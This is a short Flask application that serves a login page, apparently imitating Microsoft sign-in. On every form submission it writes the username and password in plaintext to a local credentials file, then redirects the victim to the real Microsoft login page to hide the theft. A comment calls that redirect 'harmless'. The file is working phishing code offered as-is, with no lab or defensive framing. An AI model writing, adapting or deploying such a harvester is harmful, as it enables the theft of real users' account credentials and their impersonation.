from flask import Flask, render_template, request, redirect
import os
from datetime import datetime

app = Flask(__name__)

# Log credentials
def log_credentials(username, password):
    os.makedirs("logs", exist_ok=True)
    with open("logs/credentials.txt", "a") as f:
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        f.write(f"[{timestamp}] Username: {username} | Password: {password}\n")

@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
        log_credentials(username, password)
        return redirect("https://login.microsoftonline.com")  # Redirect to real page (harmless)
    return render_template("login.html")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
